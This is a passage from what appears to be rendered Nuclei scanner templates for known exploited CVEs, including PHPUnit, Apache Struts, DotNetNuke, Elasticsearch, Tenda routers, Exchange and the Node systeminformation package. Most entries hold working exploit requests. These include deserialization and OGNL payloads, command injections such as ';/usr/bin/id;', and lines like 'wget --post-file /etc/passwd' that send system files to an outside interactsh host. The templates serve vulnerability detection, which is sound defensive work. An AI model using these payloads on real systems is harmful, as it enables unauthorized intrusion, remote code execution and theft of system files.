GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: {{Hostname}}
Content-Type: text/html

<?php echo md5(phpunit_rce);?>

```

### Step - 3

```
GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: {{Hostname}}
Content-Type: text/html

<?php echo md5(phpunit_rce);?>

```

### Step - 4

```
GET /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: {{Hostname}}
Content-Type: text/html

<?php echo md5(phpunit_rce);?>

```

### Step - 5

```
GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: {{Hostname}}
Content-Type: text/html

<?php echo md5(phpunit_rce);?>

```

### Step - 6

```
GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: {{Hostname}}
Content-Type: text/html

<?php echo md5(phpunit_rce);?>

```

### Matchers

**Type - word**

- words
  1. 6dd70f16549456495373a337e6708865
- part - body

**Type - status**

- status
  1. 200

---

# Palo Alto Network PAN-OS - Remote Code Execution

## Description

- Palo Alto Network PAN-OS and Panorama before 6.1.19, 7.0.x before 7.0.19, 7.1.x before 7.1.14, and 8.0.x before 8.0.6 allows remote attackers to execute arbitrary code via vectors involving the management interface.
- severity - critical
- tags - kev,edb,cve,cve2017,rce,vpn,panos,globalprotect

## Requests

### Step - 1

```
GET /esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337"; HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID={{randstr}};

```

### Matchers

**Type - word**

- part - body
- words
  1. @start@Success@end@

**Type - status**

- status
  1. 200

---

# Apache Struts2 S2-052 - Remote Code Execution

## Description

- The REST Plugin in Apache Struts 2.1.1 through 2.3.x before 2.3.34 and 2.5.x before 2.5.13 uses an XStreamHandler with an instance of XStream for deserialization without any type of filtering, which can lead to remote code execution when deserializing XML payloads.
- severity - high
- tags - cve,cve2017,apache,rce,struts,kev

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/struts2-rest-showcase/orders/3
- {{BaseURL}}/orders/3
  - <map>
      <entry>
        <jdk.nashorn.internal.objects.NativeString>
          <flags>0</flags>
          <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
            <dataHandler>
              <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                <is class="javax.crypto.CipherInputStream">
                  <cipher class="javax.crypto.NullCipher">
                    <initialized>false</initialized>
                    <opmode>0</opmode>
                    <serviceIterator class="javax.imageio.spi.FilterIterator">
                      <iter class="javax.imageio.spi.FilterIterator">
                        <iter class="java.util.Collections$EmptyIterator"/>
                        <next class="java.lang.ProcessBuilder">
                          <command>
                            <string>wget</string>
                            <string>--post-file</string>
                            <string>/etc/passwd</string>
                  <string>{{interactsh-url}}</string>
                          </command>
                          <redirectErrorStream>false</redirectErrorStream>
                        </next>
                      </iter>
                      <filter class="javax.imageio.ImageIO$ContainsFilter">
                        <method>
                          <class>java.lang.ProcessBuilder</class>
                          <name>start</name>
                          <parameter-types/>
                        </method>
                        <name>asdasd</name>
                      </filter>
                      <next class="string">asdasd</next>
                    </serviceIterator>
                    <lock/>
                  </cipher>
                  <input class="java.lang.ProcessBuilder$NullInputStream"/>
                  <ibuffer></ibuffer>
                  <done>false</done>
                  <ostart>0</ostart>
                  <ofinish>0</ofinish>
                  <closed>false</closed>
                </is>
                <consumed>false</consumed>
              </dataSource>
              <transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
          </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
      </entry>
      <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
      </entry>
    </map>

### Matchers

**Type - word**

- words
  1. Debugging information
  2. com.thoughtworks.xstream.converters.collections.MapConverter
- condition - and

**Type - status**

- status
  1. 500

---

# NETGEAR Routers - Authentication Bypass

## Description

- NETGEAR R8500, R8300, R7000, R6400, R7300, R7100LG, R6300v2, WNDR3400v3, WNR3500Lv2, R6250, R6700, R6900, and R8000 devices are susceptible to authentication bypass via simple crafted requests to the web management server.

- severity - high
- tags - cve,cve2017,auth-bypass,netgear,router,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/passwordrecovered.cgi?id=nuclei

### Matchers

**Type - word**

- part - body
- words
  1. right">Router\s*Admin\s*Username\<
  2. right">Router\s*Admin\s*Password\<
- condition - and

**Type - status**

- status
  1. 200

---

# Intel Active Management Technology - Authentication Bypass

## Description

- An unprivileged network attacker could gain system privileges to provisioned Intel manageability SKUs: Intel Active Management Technology (AMT) and Intel Standard Manageability (ISM). An unprivileged local attacker could provision manageability features gaining unprivileged network or local system privileges on Intel manageability SKUs: Intel Active Management Technology (AMT), Intel Standard Manageability (ISM), and Intel Small Business Technology (SBT).

- severity - critical
- tags - cve,cve2017,amt,intel,tenable,kev

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /hw-sys.htm HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. System Status
  2. Active Management Technology
- condition - and

**Type - status**

- status
  1. 200

---

# Cisco IOS 12.2(55)SE11 - Remote Code Execution

## Description

- A vulnerability in the Cisco Cluster Management Protocol (CMP) processing code in Cisco IOS and Cisco IOS XE Software could allow an unauthenticated, remote attacker to cause a reload of an affected device or remotely execute code with elevated privileges. The Cluster Management Protocol utilizes Telnet internally as a signaling and command protocol between cluster members. The vulnerability is due to the combination of two factors: (1) the failure to restrict the use of CMP-specific Telnet options only to internal, local communications between cluster members and instead accept and process such options over any Telnet connection to an affected device; and (2) the incorrect processing of malformed CMP-specific Telnet options. An attacker could exploit this vulnerability by sending malformed CMP-specific Telnet options while establishing a Telnet session with an affected Cisco device configured to accept Telnet connections. An exploit could allow an attacker to execute arbitrary code and obtain full control of the device or cause a reload of the affected device. This affects Catalyst switches, Embedded Service 2020 switches, Enhanced Layer 2 EtherSwitch Service Module, Enhanced Layer 2/3 EtherSwitch Service Module, Gigabit Ethernet Switch Module (CGESM) for HP, IE Industrial Ethernet switches, ME 4924-10GE switch, RF Gateway 10, and SM-X Layer 2/3 EtherSwitch Service Module. Cisco Bug IDs: CSCvd48893.

- severity - critical
- tags - cve2017,cisco,rce,network,kev,msf,cve

---

# DotNetNuke 5.0.0 - 9.3.0 - Cookie Deserialization Remote Code Execution

## Description

- DotNetNuke (DNN) versions between 5.0.0 - 9.3.0 are affected by a deserialization vulnerability that leads to remote code execution.
- severity - high
- tags - cve,cve2017,dotnetnuke,bypass,rce,deserialization,kev

## Requests

### Step - 1

```
GET /__ HTTP/1.1
Host: {{Hostname}}
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Cookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>

```

### Matchers

**Type - word**

- words
  1. [extensions]
  2. for 16-bit app support
- part - body
- condition - and

**Type - status**

- status
  1. 404

---

# Windows Server 2003 & IIS 6.0 - Remote Code Execution

## Description

- Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 contains a buffer overflow vulnerability in the ScStoragePathFromUrl function in the WebDAV service that could allow remote attackers to execute arbitrary code via a long header beginning with "If \<http://" in a PROPFIND request.

- severity - critical
- tags - cve,cve2017,rce,windows,iis,kev

## Requests

- Method - OPTIONS

---

# Apache Struts2 S2-053 - Remote Code Execution

## Description

- Apache Struts 2.1.x and 2.3.x with the Struts 1 plugin might allow remote code execution via a malicious field value passed in a raw message to the ActionMessage.
- severity - critical
- tags - cve,cve2017,apache,rce,struts,kev

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/integration/saveGangster.action
  - name=%25%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%23%71%29%7d&age=10&\_\_checkbox_bustedBefore=true&description=

### Matchers

**Type - word**

- part - header
- words
  1. Content-Type: text/html

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Struts 2 - Remote Command Execution

## Description

- Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 is vulnerable to remote command injection attacks through incorrectly parsing an attacker's invalid Content-Type HTTP header. The Struts vulnerability allows these commands to be executed under the privileges of the Web server.
- severity - critical
- tags - apache,kev,msf,cve,cve2017,struts,rce

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}
Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hacker','Bounty Plz')}.multipart/form-data
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*

```

### Matchers

**Type - word**

- words
  1. X-Hacker: Bounty Plz
- part - header

---

# Primetek Primefaces 5.x - Remote Code Execution

## Description

- Primetek Primefaces 5.x is vulnerable to a weak encryption flaw resulting in remote code execution.
- severity - critical
- tags - cve,cve2017,primetek,rce,injection,kev

## Requests

### Step - 1

```
POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe704aOkNwaB12Cc3Iq6NmBo%2BQZuqhqtPxdTA%3D%3D

```

### Matchers

**Type - word**

- words
  1. Mogwailabs: CHECKCHECK
- part - header

---

# Apache Tomcat Servers - Remote Code Execution

## Description

- Apache Tomcat servers 7.0.{0 to 79} are susceptible to remote code execution. By design, you are not allowed to upload JSP files via the PUT method. This is likely a security measure to prevent an attacker from uploading a JSP shell and gaining remote code execution on the server. However, due to the insufficient checks, an attacker could gain remote code execution on Apache Tomcat servers that have enabled PUT method by using a specially crafted HTTP request.

- severity - high
- tags - rce,tomcat,kev,cisa,vulhub,cve,cve2017,apache,fileupload

## Requests

- Method - PUT

---

# ElasticSearch v1.1.1/1.2 RCE

## Description

- The default configuration in Elasticsearch before 1.2 enables dynamic scripting, which allows remote attackers to execute arbitrary MVEL expressions and Java code via the source parameter to \_search. Be aware this only violates the vendor's intended security policy if the user does not run Elasticsearch in its own independent virtual machine.

- severity - critical
- tags - rce,elasticsearch,kev,vulhub,cve,cve2014,elastic

## Requests

### Step - 1

```
POST /_search?pretty HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"cat /etc/passwd\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}

```

### Matchers

**Type - word**

- words
  1. application/json
- part - header

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# ShellShock - Remote Code Execution

## Description

- GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka ShellShock.
- severity - critical
- tags - cve,cve2014,rce,shellshock,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}/cgi-bin/status
- {{BaseURL}}/cgi-bin/stats
- {{BaseURL}}/cgi-bin/test
- {{BaseURL}}/cgi-bin/status/status.cgi
- {{BaseURL}}/test.cgi
- {{BaseURL}}/debug.cgi
- {{BaseURL}}/cgi-bin/test-cgi

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

# Aviatrix Controller 6.x before 6.5-1804.1922 Remote Command Execution

## Description

- Aviatrix Controller 6.x before 6.5-1804.1922 contains a vulnerability that allows unrestricted upload of a file with a dangerous type, which allows an unauthenticated user to execute arbitrary code via directory traversal.
- severity - critical
- tags - cve,cve2021,rce,aviatrix,kev,fileupload,intrusive

## Requests

### Step - 1

```
POST /v1/backend1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/{{randstr}}.php&data=HACKERMAN<?php phpinfo()?>

```

### Step - 2

```
GET /v1/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. HACKERMAN
  2. PHP Extension
  3. PHP Version
- condition - and

---

# Zoho ManageEngine ServiceDesk Plus - Remote Code Execution

## Description

- Zoho ManageEngine ServiceDesk Plus before 11306, ServiceDesk Plus MSP before 10530, and SupportCenter Plus before 11014 are vulnerable to unauthenticated remote code execution.
- severity - critical
- tags - rce,kev,msf,cve,cve2021,zoho,manageengine

## Requests

- Method - GET

### URL

- {{BaseURL}}/RestAPI/ImportTechnicians

### Matchers

**Type - word**

- words
  1. \<form name="ImportTechnicians"

**Type - status**

- status
  1. 200

---

# Tenda Router AC11 - Remote Command Injection

## Description

- Tenda Router AC11 is susceptible to remote command injection vulnerabilities in the web-based management interface that could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.
- severity - critical
- tags - cve,cve2021,tenda,rce,oast,router,mirai,kev

## Requests

### Step - 1

```
POST /goform/setmac HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Referer: {{BaseURL}}/index.htmlr
Content-Type: application/x-www-form-urlencoded

module1=wifiBasicCfg&doubleBandUnityEnable=false&wifiTotalEn=true&wifiEn=true&wifiSSID=Tenda_B0E040&mac=wget+http://{{interactsh-url}}&wifiSecurityMode=WPAWPA2%2FAES&wifiPwd=Password12345&wifiHideSSID=false&wifiEn_5G=true&wifiSSID_5G=Tenda_B0E040_5G&wifiSecurityMode_5G=WPAWPA2%2FAES&wifiPwd_5G=Password12345&wifiHideSSID_5G=false&module2=wifiGuest&guestEn=false&guestEn_5G=false&guestSSID=Tenda_VIP&guestSSID_5G=Tenda_VIP_5G&guestPwd=&guestPwd_5G=&guestValidTime=8&guestShareSpeed=0&module3=wifiPower&wifiPower=high&wifiPower_5G=high&module5=wifiAdvCfg&wifiMode=bgn&wifiChannel=auto&wifiBandwidth=auto&wifiMode_5G=ac&wifiChannel_5G=auto&wifiBandwidth_5G=auto&wifiAntijamEn=false&module6=wifiBeamforming&wifiBeaformingEn=true&module7=wifiWPS&wpsEn=true&wanType=static

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Buffalo WSR-2533DHPL2 - Path Traversal

## Description

- Buffalo WSR-2533DHPL2 firmware version \<= 1.02 and WSR-2533DHP3 firmware version \<= 1.24 are susceptible to a path traversal vulnerability that could allow unauthenticated remote attackers to bypass authentication in their web interfaces.

- severity - critical
- tags - cve,cve2021,lfi,buffalo,firmware,iot,kev,tenable

## Requests

### Step - 1

```
GET /images/..%2finfo.html HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}/info.html

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. URLToken(cgi_path)
  2. pppoe
  3. wan
- condition - and

---

# GitLab CE/EE - Remote Code Execution

## Description

- GitLab CE/EE starting from 11.9 does not properly validate image files that were passed to a file parser, resulting in a remote command execution vulnerability. This template attempts to passively identify vulnerable versions of GitLab without the need for an exploit by matching unique hashes for the application-\<hash>.css file in the header for unauthenticated requests. Positive matches do not guarantee exploitability. Tooling to find relevant hashes based on the semantic version ranges specified in the CVE is linked in the references section below.
- severity - critical
- tags - kev,hackerone,cve,cve2021,gitlab,rce

## Requests

- Method - GET

### URL

- {{BaseURL}}/users/sign_in

### Matchers

**Type - word**

- words
  1. 015d088713b23c749d8be0118caeb21039491d9812c75c913f48d53559ab09df
  2. 02aa9533ec4957bb01d206d6eaa51d762c7b7396362f0f7a3b5fb4dd6088745b
  3. 051048a171ccf14f73419f46d3bd8204aa3ed585a72924faea0192f53d42cfce
  4. 08858ced0ff83694fb12cf155f6d6bf450dcaae7192ea3de8383966993724290
  5. 0993beabc8d2bb9e3b8d12d24989426b909921e20e9c6a704de7a5f1dfa93c59
  6. 0a5b4edebfcb0a7be64edc06af410a6fbc6e3a65b76592a9f2bcc9afea7eb753
  7. 1084266bd81c697b5268b47c76565aa86b821126a6b9fe6ea7b50f64971fc96f
  8. 14c313ae08665f7ac748daef8a70010d2ea9b52fd0cae594ffa1ffa5d19c43f4
  9. 1626b2999241b5a658bddd1446648ed0b9cc289de4cc6e10f60b39681a0683c4
  10. 20f01320ba570c73e01af1a2ceb42987bcb7ac213cc585c187bec2370cf72eb6
  11. 27d2c4c4e2fcf6e589e3e1fe85723537333b087003aa4c1d2abcf74d5c899959
  12. 292ca64c0c109481b0855aea6b883a588bd293c6807e9493fc3af5a16f37f369
  13. 2eaf7e76aa55726cc0419f604e58ee73c5578c02c9e21fdbe7ae887925ea92ae
  14. 30a9dffe86b597151eff49443097496f0d1014bb6695a2f69a7c97dc1c27828f
  15. 318ee33e5d14035b04832fa07c492cdf57788adda50bb5219ef75b735cbf00e2
  16. 33313f1ff2602ef43d945e57e694e747eb00344455ddb9b2544491a3af2696a1
  17. 335f8ed58266e502d415f231f6675a32bb35cafcbaa279baa2c0400d4a9872ac
  18. 34031b465d912c7d03e815c7cfaff77a3fa7a9c84671bb663026d36b1acd3f86
  19. 3407a4fd892e9d5024f3096605eb1e25cad75a8bf847d26740a1e6a77e45b087
  20. 340c31a75c5150c5e501ec143849adbed26fed0da5a5ee8c60fb928009ea3b86
  21. 38981e26a24308976f3a29d6e5e2beef57c7acda3ad0d5e7f6f149d58fd09d3d
  22. 3963d28a20085f0725884e2dbf9b5c62300718aa9c6b4b696c842a3f4cf75fcd
  23. 39b154eeefef684cb6d56db45d315f8e9bf1b2cc86cf24d8131c674521f5b514
  24. 39fdbd63424a09b5b065a6cc60c9267d3f49950bf1f1a7fd276fe1ece4a35c09
  25. 3b51a43178df8b4db108a20e93a428a889c20a9ed5f41067d1a2e8224740838e
  26. 3cbf1ae156fa85f16d4ca01321e0965db8cfb9239404aaf52c3cebfc5b4493fb
  27. 40d8ac21e0e120f517fbc9a798ecb5caeef5182e01b7e7997aac30213ef367b3
  28. 4448d19024d3be03b5ba550b5b02d27f41c4bdba4db950f6f0e7136d820cd9e1
  29. 450cbe5102fb0f634c533051d2631578c8a6bae2c4ef1c2e50d4bfd090ce3b54
  30. 455d114267e5992b858fb725de1c1ddb83862890fe54436ffea5ff2d2f72edc8
  31. 4568941e60dbfda3472e3f745cd4287172d4e6cce44bed85390af9e4e2112d0b
  32. 45b2cf643afd34888294a073bf55717ea00860d6a1dca3d301ded1d0040cac44
  33. 473ef436c59830298a2424616d002865f17bb5a6e0334d3627affa352a4fc117
  34. 4990bb27037f3d5f1bffc0625162173ad8043166a1ae5c8505aabe6384935ce2
  35. 4a081f9e3a60a0e580cad484d66fbf5a1505ad313280e96728729069f87f856e
  36. 4abc4e078df94075056919bd59aed6e7a0f95067039a8339b8f614924d8cb160
  37. 504940239aafa3b3a7b49e592e06a0956ecaab8dbd4a5ea3a8ffd920b85d42eb
  38. 52560ba2603619d2ff1447002a60dcb62c7c957451fb820f1894e1ce7c23821c
  39. 530a8dd34c18ca91a31fbae2f41d4e66e253db0343681b3c9640766bf70d8edf
  40. 5440e2dd89d3c803295cc924699c93eb762e75d42178eb3fe8b42a5093075c71
  41. 62e4cc014d9d96f9cbf443186289ffd9c41bdfe951565324891dcf38bcca5a51
  42. 64e10bc92a379103a268a90a7863903eacb56843d8990fff8410f9f109c3b87a
  43. 655ad8aea57bdaaad10ff208c7f7aa88c9af89a834c0041ffc18c928cc3eab1f
  44. 67ac5da9c95d82e894c9efe975335f9e8bdae64967f33652cd9a97b5449216d2
  45. 69a1b8e44ba8b277e3c93911be41b0f588ac7275b91a184c6a3f448550ca28ca
  46. 6ae610d783ba9a520b82263f49d2907a52090fecb3ac37819cea12b67e6d94fb
  47. 70ce56efa7e602d4b127087b0eca064681ecdd49b57d86665da8b081da39408b
  48. 7310c45f08c5414036292b0c4026f281a73cf8a01af82a81257dd343f378bbb5
  49. 73a21594461cbc9a2fb00fc6f94aec1a33ccf435a7d008d764ddd0482e08fc8d
  50. 77566acc818458515231d0a82c131a42890d771ea998b9f578dc38e0eb7e517f
  51. 78812856e55613c6803ecb31cc1864b7555bf7f0126d1dfa6f37376d37d3aeab
  52. 79837fd1939f90d58cc5a842a81120e8cecbc03484362e88081ebf3b7e3830e9
  53. 7b1dcbacca4f585e2cb98f0d48f008acfec617e473ba4fd88de36b946570b8b9
  54. 7f1c7b2bfaa6152740d453804e7aa380077636cad101005ed85e70990ec20ec5
  55. 81c5f2c7b2c0b0abaeb59585f36904031c21b1702c24349404df52834fbd7ad3
  56. 83dc10f687305b22e602ba806619628a90bd4d89be7c626176a0efec173ecff1
  57. 93ebf32a4bd988b808c2329308847edd77e752b38becc995970079a6d586c39b
  58. 969119f639d0837f445a10ced20d3a82d2ea69d682a4e74f39a48a4e7b443d5e
  59. 9b4e140fad97320405244676f1a329679808e02c854077f73422bd8b7797476b
  60. 9c095c833db4364caae1659f4e4dcb78da3b5ec5e9a507154832126b0fe0f08e
  61. a0c92bafde7d93e87af3bc2797125cba613018240a9f5305ff949be8a1b16528
  62. a9308f85e95b00007892d451fd9f6beabcd8792b4c5f8cd7524ba7e941d479c9
  63. ac9b38e86b6c87bf8db038ae23da3a5f17a6c391b3a54ad1e727136141a7d4f5
  64. ae0edd232df6f579e19ea52115d35977f8bdbfa9958e0aef2221d62f3a39e7d8
  65. aeddf31361633b3d1196c6483f25c484855e0f243e7f7e62686a4de9e10ec03b
  66. b50bfeb87fe7bb245b31a0423ccfd866ca974bc5943e568ce47efb4cd221d711
  67. b64a1277a08c2901915525143cd0b62d81a37de0a64ec135800f519cb0836445
  68. bb1565ffd7c937bea412482ed9136c6057be50356f1f901379586989b4dfe2ca
  69. be9a23d3021354ec649bc823b23eab01ed235a4eb730fd2f4f7cdb2a6dee453a
  70. bec9544b57b8b2b515e855779735ad31c3eacf65d615b4bfbd574549735111e7
  71. bf1ba5d5d3395adc5bad6f17cc3cb21b3fb29d3e3471a5b260e0bc5ec7a57bc4
  72. bf1c397958ee5114e8f1dadc98fa9c9d7ddb031a4c3c030fa00c315384456218
  73. c8d8d30d89b00098edab024579a3f3c0df2613a29ebcd57cdb9a9062675558e4
  74. c923fa3e71e104d50615978c1ab9fcfccfcbada9e8df638fc27bf4d4eb72d78c
  75. d0850f616c5b4f09a7ff319701bce0460ffc17ca0349ad2cf7808b868688cf71
  76. d161b6e25db66456f8e0603de5132d1ff90f9388d0a0305d2d073a67fd229ddb
  77. d56f0577fbbbd6f159e9be00b274270cb25b60a7809871a6a572783b533f5a3c
  78. d812b9bf6957fafe35951054b9efc5be6b10c204c127aa5a048506218c34e40f
  79. dc6b3e9c0fad345e7c45a569f4c34c3e94730c33743ae8ca055aa6669ad6ac56
  80. def1880ada798c68ee010ba2193f53a2c65a8981871a634ae7e18ccdcd503fa3
  81. e2578590390a9eb10cd65d130e36503fccb40b3921c65c160bb06943b2e3751a
  82. e4b6f040fe2e04c86ed1f969fc72710a844fe30c3501b868cb519d98d1fe3fd0
  83. eb078ffe61726e3898dc9d01ea7955809778bde5be3677d907cbd3b48854e687
  84. ec9dfedd7bd44754668b208858a31b83489d5474f7606294f6cc0128bb218c6d
  85. ed4780bb05c30e3c145419d06ad0ab3f48bd3004a90fb99601f40c5b6e1d90fd
  86. ef53a4f4523a4a0499fb892d9fb5ddb89318538fef33a74ce0bf54d25777ea83
  87. f154ef27cf0f1383ba4ca59531058312b44c84d40938bc8758827023db472812
  88. f7d1309f3caef67cb63bd114c85e73b323a97d145ceca7d6ef3c1c010078c649
  89. f9ab217549b223c55fa310f2007a8f5685f9596c579f5c5526e7dcb204ba0e11
- condition - or

### Extractors

**Type - regex**

- group - 1
- regex
  1. (?:application-)(\S{64})(?:\.css)

---

# Apache \<= 2.4.48 - Mod_Proxy SSRF

## Description

- Apache 2.4.48 and below contain an issue where uri-path can cause mod_proxy to forward the request to an origin server chosen by the remote user.
- severity - critical
- tags - cve,cve2021,ssrf,apache,mod-proxy,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/?unix:{{repeat("A", 7701)}}|http://interact.sh/

### Matchers

**Type - word**

- words
  1. Interactsh Server

---

# Microsoft Exchange Server SSRF Vulnerability

## Description

- This vulnerability is part of an attack chain that could allow remote code execution on Microsoft Exchange Server. The initial attack requires the ability to make an untrusted connection to Exchange server port 443. Other portions of the chain can be triggered if an attacker already has access or can convince an administrator to open a malicious file. Be aware his CVE ID is unique from CVE-2021-26412, CVE-2021-26854, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065, and CVE-2021-27078.
- severity - critical
- tags - cve,cve2021,ssrf,rce,exchange,oast,microsoft,kev

## Requests

### Step - 1

```
GET /owa/auth/x.js HTTP/1.1
Host: {{Hostname}}
Cookie: X-AnonResource=true; X-AnonResource-Backend={{interactsh-url}}/ecp/default.flt?~3;

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# YeaLink DM 3.6.0.20 - Remote Command Injection

## Description

- Yealink Device Management (DM) 3.6.0.20 allows command injection as root via the /sm/api/v1/firewall/zone/services URI, without authentication.
- severity - critical
- tags - cve,cve2021,rce,yealink,mirai,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;

### Matchers

**Type - word**

- condition - and
- part - body
- words
  1. uid
  2. gid
  3. groups

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- regex
  1. (u|g)id=.\*

---

# Node.JS System Information Library \<5.3.1 - Remote Command Injection

## Description

- Node.JS System Information Library System before version 5.3.1 is susceptible to remote command injection. Node.JS (npm package "systeminformation") is an open source collection of functions to retrieve detailed hardware, system and OS information.
- severity - high
- tags - nodejs,cve,cve2021,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20{{interactsh-url}})

### Matchers

